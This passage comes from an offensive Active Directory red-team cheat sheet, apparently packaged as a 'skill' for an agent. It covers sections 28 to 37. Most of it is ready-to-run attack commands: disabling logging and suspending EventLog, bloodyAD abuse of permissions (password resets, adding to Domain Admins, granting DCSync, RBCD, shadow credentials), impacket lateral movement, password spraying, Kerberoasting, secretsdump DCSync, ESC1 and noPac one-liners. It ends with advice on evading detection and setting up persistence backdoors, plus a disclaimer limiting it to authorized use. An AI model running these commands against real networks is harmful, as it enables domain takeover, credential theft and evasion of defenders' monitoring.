- **PSReadLine history clear** (`ConsoleHost_history.txt`)
- **Module logging / Transcription disable via reg + group policy override**

### 28.1 ScriptBlock logging bypass
```powershell
[Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
```

### 28.2 Phant0m
```powershell
# Find and suspend EventLog service threads
Get-Process svchost | Where-Object { $_.Modules.ModuleName -contains 'wevtsvc.dll' } | Stop-Process
```

---

## 29. Misc Modern / Bonus Niche

- **CLR loader (assembly load via PowerShell-less host)**
- **JScript / VBScript host (cscript) for old-school exec**
- **MSIX / AppX malicious installers**
- **App-V / ClickOnce delivery**
- **InstallerFileTakeOver / FilesystemRedirect privesc tricks**
- **WSL abuse** — Linux subsystem to evade Windows EDR view
- **WSA (Windows Subsystem for Android) abuse**
- **Hyper-V VM escape research / nested guest staging**
- **Container breakout on Windows containers (silo escape)**
- **Speculative side channels for cred extraction (research)**
- **Logon script SMB hijack** — race write to NETLOGON
- **Sysvol DFSR replica MITM**
- **DFS namespace abuse**
- **ms-DS-MachineAccountQuota = 0 still bypassable via owner CreateChild**
- **Pre-2k computer accounts (default password = lowercase name)**
- **GPO immediate scheduled task XML injection**
- **Subnet object writes → site-link manipulation → replication path control**
- **WSMan/CredSSP double-hop creds left in memory**
- **Restricted Admin RDP → hash-only auth**
- **Protected Users group bypass via NTLM fallback**


---

## 30. bloodyAD Command Cheat Sheet

`bloodyAD` is the Linux Swiss-army knife for AD object manipulation. Authenticate via password, NT hash, Kerberos ccache, or certificate. Defaults to LDAP; use `--secure` for LDAPS (needed for password resets/computer creation).

### 30.1 Authentication forms
```bash
# Password
bloodyAD --host DC -d domain.local -u owned -p 'pass' <verb> ...
# NT hash (PtH)
bloodyAD --host DC -d domain.local -u owned -p ':NTHASH' <verb> ...
# Kerberos ticket
KRB5CCNAME=owned.ccache bloodyAD --host DC.domain.local -d domain.local -u owned -k <verb> ...
# Certificate (PKINIT / Shadow Creds)
bloodyAD --host DC -d domain.local -u owned --cert user.pem --key user.key <verb> ...
# LDAPS (mandatory for password ops over LDAP)
bloodyAD --host DC -d domain.local -u owned -p pass --secure <verb> ...
```

### 30.2 Recon (`get`)
```bash
bloodyAD ... get children                                       # list root containers
bloodyAD ... get children --target 'CN=Users,DC=domain,DC=local'
bloodyAD ... get object TARGET                                  # full attributes
bloodyAD ... get object TARGET --attr memberOf,servicePrincipalName,userAccountControl
bloodyAD ... get search --filter '(adminCount=1)'               # raw LDAP filter
bloodyAD ... get writable                                       # objects YOU can write
bloodyAD ... get writable --otype USER --right WRITE            # filter
bloodyAD ... get membership owned                               # group memberships (recursive)
bloodyAD ... get dnsDump                                        # AD-integrated DNS
bloodyAD ... get trusts                                         # trust enumeration
```

### 30.3 Password reset / change
```bash
# Force-reset target (needs ForceChangePassword / GenericAll)
bloodyAD ... set password TARGET 'NewP@ss123!'

# Self change (knows old pass)
bloodyAD ... set password owned 'NewP@ss123!' -oldpass 'CurrentPass'

# Reset via NTLM hash auth
bloodyAD --host DC -d domain.local -u owned -p :NTHASH set password TARGET 'NewP@ss!'

# Reset using LDAPS (required when KDC enforces secure password change)
bloodyAD --host DC -d domain.local -u owned -p pass --secure set password TARGET 'NewP@ss!'
```

### 30.4 Enable / disable account & UAC flag manipulation
```bash
# Enable disabled account
bloodyAD ... remove uac TARGET -f ACCOUNTDISABLE

# Disable account
bloodyAD ... add uac TARGET -f ACCOUNTDISABLE

# Unlock locked account (clear lockoutTime)
bloodyAD ... set object TARGET lockoutTime -v 0

# Disable Kerberos preauth → AS-REP roastable
bloodyAD ... add uac TARGET -f DONT_REQ_PREAUTH

# Enable preauth back
bloodyAD ... remove uac TARGET -f DONT_REQ_PREAUTH

# Mark for unconstrained delegation (needs SeEnableDelegation, usually DA)
bloodyAD ... add uac TARGET -f TRUSTED_FOR_DELEGATION

# Set "Password never expires"
bloodyAD ... add uac TARGET -f DONT_EXPIRE_PASSWD

# Show current UAC flags
bloodyAD ... get object TARGET --attr userAccountControl
```
Common UAC flags: `ACCOUNTDISABLE`, `LOCKOUT`, `PASSWD_NOTREQD`, `DONT_REQ_PREAUTH`, `TRUSTED_FOR_DELEGATION`, `TRUSTED_TO_AUTH_FOR_DELEGATION`, `NOT_DELEGATED`, `USE_DES_KEY_ONLY`, `DONT_EXPIRE_PASSWD`, `WORKSTATION_TRUST_ACCOUNT`, `SERVER_TRUST_ACCOUNT`.

### 30.5 Group membership manipulation
```bash
# Add member to group (needs WriteProperty on `member`, GenericAll, or AddMember)
bloodyAD ... add groupMember 'Domain Admins' owned
bloodyAD ... add groupMember 'Remote Management Users' owned

# Remove member
bloodyAD ... remove groupMember 'Domain Admins' owned

# Self-add (when you have AddSelf)
bloodyAD ... add groupMember 'Backup Operators' owned

# Recursive enumeration first
bloodyAD ... get membership 'Domain Admins' --no-recurse
```

### 30.6 Owner transfer (WriteOwner abuse)
```bash
# Take ownership of an object
bloodyAD ... set owner TARGET owned          # syntax: set owner <target> <new_owner>

# Then grant yourself any right
bloodyAD ... add genericAll TARGET owned
# or
bloodyAD ... add dcsync owned                # add DCSync rights on domain root (when owner of domain object)
```

### 30.7 ACE / DACL manipulation
```bash
# Grant rights
bloodyAD ... add genericAll TARGET owned                # Full control
bloodyAD ... add genericWrite TARGET owned              # Write attrs
bloodyAD ... add writeOwner TARGET owned
bloodyAD ... add writeDacl TARGET owned
bloodyAD ... add allExtendedRights TARGET owned         # incl ForceChangePassword
bloodyAD ... add rbcd TARGET owned                      # write msDS-AllowedToActOnBehalfOfOtherIdentity
bloodyAD ... add shadowCredentials TARGET owned         # add Key Credential Link
bloodyAD ... add dcsync owned                           # DS-Replication-Get-Changes(-All) on domain root

# Remove rights
bloodyAD ... remove genericAll TARGET owned
bloodyAD ... remove rbcd TARGET owned
bloodyAD ... remove shadowCredentials TARGET owned --key-id <id>

# View raw DACL
bloodyAD ... get object TARGET --attr nTSecurityDescriptor --raw
```

### 30.8 Computer accounts (MAQ)
```bash
# Add computer (uses LDAPS; falls back to SAMR if --secure unavailable)
bloodyAD ... --secure add computer 'evil$' 'Pwn1!'

# Add computer with custom DNS (Certifried prerequisite)
bloodyAD ... --secure add computer 'evil$' 'Pwn1!' --dns DC.domain.local

# Remove
bloodyAD ... remove object 'evil$'

# Read MAQ
bloodyAD ... get object 'DC=domain,DC=local' --attr ms-DS-MachineAccountQuota
```

### 30.9 Shadow Credentials (PKINIT)
```bash
# Add Key Credential Link entry
bloodyAD ... add shadowCredentials TARGET                 # auto-generates key
bloodyAD ... add shadowCredentials TARGET --path out.pfx --password '' 

# List existing
bloodyAD ... get object TARGET --attr msDS-KeyCredentialLink

# Remove specific key (cleanup post-exploit)
bloodyAD ... remove shadowCredentials TARGET --key-id <DeviceID>
```

### 30.10 SPN management (targeted Kerberoast)
```bash
# Add SPN to target user (needs WriteProperty on servicePrincipalName)
bloodyAD ... add spn TARGET 'cifs/fakehost'

# Remove SPN
bloodyAD ... remove spn TARGET 'cifs/fakehost'

# Then roast offline
GetUserSPNs.py domain.local/owned:pass -dc-ip DC -request-user TARGET
```

### 30.11 DNS records (AD-integrated DNS)
```bash
# Add A record (needs DnsAdmins or write on dnsZone)
bloodyAD ... add dnsRecord attacker 10.0.0.99
# Custom type
bloodyAD ... add dnsRecord attacker 10.0.0.99 --type A --zone domain.local --ttl 60
# Remove
bloodyAD ... remove dnsRecord attacker
# List
bloodyAD ... get dnsDump --zone domain.local
```

### 30.12 Generic object write (raw attribute set)
```bash
# Arbitrary attribute set
bloodyAD ... set object TARGET <attribute> -v <value>
# Multi-value append
bloodyAD ... set object TARGET <attribute> -v <value1> -v <value2>
# Examples
bloodyAD ... set object TARGET userPrincipalName -v 'admin@domain.local'    # ESC9/14 prep
bloodyAD ... set object TARGET dNSHostName -v 'DC01.domain.local'           # Certifried prep
bloodyAD ... set object TARGET msDS-AllowedToActOnBehalfOfOtherIdentity -v <SDDL>
bloodyAD ... set object TARGET altSecurityIdentities -v 'X509:<I>...<S>...'  # ESC14
```

### 30.13 GMSA / LAPS extraction
```bash
bloodyAD ... get object 'CN=svc_gmsa,CN=Managed Service Accounts,DC=domain,DC=local' --attr msDS-ManagedPassword
bloodyAD ... get object COMPUTER --attr ms-Mcs-AdmPwd                       # legacy LAPS
bloodyAD ... get object COMPUTER --attr msLAPS-EncryptedPassword            # LAPSv2
```

### 30.14 End-to-end chains using only bloodyAD
```bash
# Chain A: GenericAll on user → reset → DA via group
bloodyAD ... set password svc_admin 'P@ss123!'
bloodyAD ... add groupMember 'Domain Admins' svc_admin

# Chain B: WriteOwner → take ownership → grant DCSync
bloodyAD ... set owner 'DC=domain,DC=local' owned
bloodyAD ... add dcsync owned
secretsdump.py 'domain.local/owned:pass'@DC -just-dc

# Chain C: Disabled DA-equivalent account → enable → reset → use
bloodyAD ... remove uac old_admin -f ACCOUNTDISABLE
bloodyAD ... set password old_admin 'NewP@ss!'
bloodyAD ... get membership old_admin

# Chain D: GenericWrite on computer → RBCD
bloodyAD ... --secure add computer 'evil$' 'Pwn1!'
bloodyAD ... add rbcd VICTIM evil$
getST.py -spn cifs/VICTIM.domain.local -impersonate Administrator 'domain.local/evil$:Pwn1!'

# Chain E: GenericAll → Shadow Credentials → NT hash
bloodyAD ... add shadowCredentials TARGET --path tgt.pfx --password ''
certipy auth -pfx tgt.pfx -dc-ip DC

# Chain F: AdminSDHolder backdoor
bloodyAD ... add genericAll 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' owned
# wait ~60 min for SDProp → propagates to all protected groups
```

### 30.15 Kerberos auth + bloodyAD
```bash
getTGT.py 'domain.local/owned:pass'
KRB5CCNAME=owned.ccache bloodyAD --host DC.domain.local -d domain.local -u owned -k get writable
```

---

## 31. Lateral Movement Quick Ref

```bash
# Impacket (Linux)
psexec.py domain.local/user:pass@HOST
smbexec.py domain.local/user:pass@HOST          # quieter than psexec
wmiexec.py domain.local/user:pass@HOST          # no service
atexec.py domain.local/user:pass@HOST 'whoami'  # task scheduler
dcomexec.py domain.local/user:pass@HOST         # MMC20/ShellWindows DCOM
mssqlclient.py domain.local/user:pass@SQL -windows-auth   # xp_cmdshell

# Kerberos (PtT / PtH overpass)
KRB5CCNAME=admin.ccache wmiexec.py -k -no-pass HOST.domain.local
getTGT.py domain.local/user -hashes :HASH

# WinRM
evil-winrm -i HOST -u user -p pass
nxc winrm HOST -u user -H NTHASH -x 'whoami'

# RDP w/ NTLM
xfreerdp /u:user /pth:HASH /v:HOST /dynamic-resolution
```

---

## 32. End-to-End Chain Patterns (memorize)

1. **Null/Anon → users → AS-REP roast → crack → BloodHound → ACL edge → DA**
2. **Foothold → Kerberoast → crack svc → BloodHound owned → GenericWrite → targeted Kerberoast → DA**
3. **Foothold → MAQ ≥1 → addcomputer → coerce DC → relay to LDAP → RBCD → S4U → DA**
4. **Foothold → ADCS find ESC1/8 → certipy req → certipy auth → NT hash of TARGET / DC$**
5. **Foothold → GenericAll on TARGET → Shadow Creds (PKINIT) → TARGET NT hash → pivot**
6. **Backup Op on DC → SeBackup → diskshadow → NTDS.dit → DCSync offline**
7. **SeImpersonate on web/SQL host → Potato → SYSTEM → DPAPI/LSASS → svc creds → AD**
8. **WriteOwner DC$ + ADCS → cert template manipulation → DC takeover**
9. **Unconstrained host → coerce DC → TGT → DCSync**
10. **Tier-0 misclassification: any user with GenericAll on `AdminSDHolder` → silent DA grant via SDProp**
11. **Foothold → ADCS ESC8 → coerce DC HTTP auth → relay → DC cert → DC$ hash → DCSync**
12. **WSUS HTTP MITM → push signed malicious "update" → SYSTEM on all clients**
13. **SCCM NAA creds → DPAPI decrypt → domain creds → site database → Full Admin → RCE all clients**
14. **EntraID device code phish → Graph token → add app secret → persist → pivot on-prem via PHS**

---

## 33. OPSEC / Detection Awareness
- LDAP queries → 4662 events (filter on dangerous GUIDs)
- AS-REP/Kerberoast → 4768/4769 with weak encryption (RC4=0x17)
- DCSync → 4662 with `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DRSUAPI)
- ntlmrelayx → smb anomaly + 4624 type-3 from relay box
- shadow creds → 5136 modify on `msDS-KeyCredentialLink`
- Coercion → DCERPC EFSRPC/MS-RPRN/MS-DFSNM/MS-FSRVP traffic
- Use Kerberos over NTLM, PKINIT over password, AES over RC4 to blend
- Drop `--no-smb-server` and avoid SMB lateral from suspicious hosts
- Spread-out timing; jitter LDAP paged queries; randomise computer names; honour Protected Users
- Avoid EventLog clearing — prefer targeted ETW provider suspension
- Wipe PSReadLine history after use
- Use signed / LOLBin loaders to reduce static detection

---

## 34. Tooling Inventory
| Stage | Linux | Windows |
|---|---|---|
| Recon | bloodhound-python, ldapdomaindump, nxc, ldeep, certipy find | SharpHound, ADRecon, PingCastle, PowerView, Whisker |
| ACL abuse | bloodyAD, dacledit.py, owneredit.py, addcomputer.py, rbcd.py, targetedKerberoast.py | PowerView Set-DomainObject, ActiveDirectory, Set-ADAccountControl |
| Shadow creds | certipy, pywhisker, PKINITtools | Whisker, Rubeus |
| ADCS | certipy, ntlmrelayx --adcs | Certify, Certi |
| Kerberos | impacket (GetUserSPNs, GetNPUsers, getTGT, getST, ticketer, secretsdump), kerbrute | Rubeus, mimikatz, asktgt, kerberoast |
| Coerce | PetitPotam.py, coercer, dfscoerce.py, printerbug.py, shadowcoerce.py | SpoolSample, PetitPotam.exe, DFSCoerce.exe |
| Relay | ntlmrelayx.py, krbrelayx.py | Inveigh, KrbRelay, KrbRelayUp |
| LSASS | nanodump (cross), pypykatz | Mimikatz, nanodump, comsvcs.dll, SafetyKatz |
| Privesc | linpeas n/a, BloodHound | winPEAS, Seatbelt, PrivescCheck, PowerUp, GodPotato, JuicyPotatoNG, PrintSpoofer, SeManageVolumeExploit |
| Ticket forge | impacket ticketer | Rubeus, mimikatz `kerberos::golden` |
| Persistence | — | DSRM, Skeleton Key, AdminSDHolder, GoldenGMSA, custom SSP |
| Azure AD | ROADtools, TokenTactics, AzureHound, AADInternals | TokenTactics, Stormspotter |
| WSUS/SCCM | pywsus, sccmhunter | sccmhunter (PS/C#) |

---

## 35. Quick Reference — One-Liners
```bash
# Username enum (no creds)
kerbrute userenum -d domain.local --dc DC users.txt
# Password spray
nxc smb DC -u users.txt -p 'Spring2026!' --continue-on-success
# Find AS-REP roastable + roast
GetNPUsers.py domain.local/ -usersfile users -no-pass -outputfile asrep.hash
# Roast all SPNs
GetUserSPNs.py domain.local/owned:pass -dc-ip DC -request -outputfile krb.hash
# DCSync one-liner
secretsdump.py 'domain.local/owned:pass'@DC -just-dc-user 'krbtgt'
# RBCD complete chain
addcomputer.py -computer-name 'evil$' -computer-pass 'P!' -dc-host DC 'domain.local/owned:pass' && \
rbcd.py -delegate-from 'evil$' -delegate-to 'VICTIM$' -dc-ip DC -action write 'domain.local/owned:pass' && \
getST.py -spn 'cifs/VICTIM.domain.local' -impersonate Administrator 'domain.local/evil$:P!' && \
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass VICTIM.domain.local
# ESC1
certipy req -u owned@domain.local -p pass -ca CA -template Vuln -upn Administrator@domain.local && \
certipy auth -pfx administrator.pfx
# Shadow creds
certipy shadow auto -u owned@domain.local -p pass -account TARGET
# noPac
noPac.py -dc-ip DC -dc-host DC domain.local/owned:pass --impersonate Administrator -use-ldap -shell
# BloodHound owned → DA path
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p
# Coerce + relay all primitives
coercer coerce -u owned -p pass -d domain.local -t VICTIM -l LISTENER --always-continue
```

---

## 36. Prereq Decision Tree
```
have any creds? ──no──> kerbrute userenum + spray + ASREP roast + null SMB/LDAP
                │
                yes
                ├── BloodHound collect All
                ├── certipy find -vulnerable
                ├── owned principal → outbound ACL edges?
                │     ├── on user → reset / shadow creds / targeted roast
                │     ├── on group → AddMember
                │     ├── on computer → RBCD / shadow creds
                │     ├── on GPO/OU → pyGPOAbuse
                │     └── on AdminSDHolder/Domain → DCSync rights
                ├── delegation flags? → unconstrained coerce / S4U / RBCD
                ├── ADCS vuln? → ESC1/2/3/4/6/7/8/9/11/13/15
                ├── MAQ>0? → addcomputer pivot
                ├── coercion + relay? → ntlmrelayx --delegate-access / --adcs
                ├── host privesc? → whoami /priv → Potato / SeBackup / SeImpersonate
                ├── Azure AD? → device code / illicit consent / FOCI / PRT
                └── no edges → host loot → DPAPI / PSReadLine / LSASS / SAM → re-feed BloodHound
```

---

## 37. Final Rule
After every step, ask:
> "What new edges did this credential / hash / ticket create in BloodHound? Re-mark owned and re-query shortest path to DA."

Never stop at first DA — enumerate trusts, child/parent forests, foreign principals. Persistence: krbtgt rotation cycle (twice, or skeleton key), DSRM, GoldenGMSA, AdminSDHolder backdoor, certificate-based (Golden Cert via stolen CA cert).

---

**DISCLAIMER:** This skill is for authorized red team, penetration testing, lab, and research purposes only. Unauthorized access to computer systems is illegal. Always obtain proper written authorization before using any technique described here.
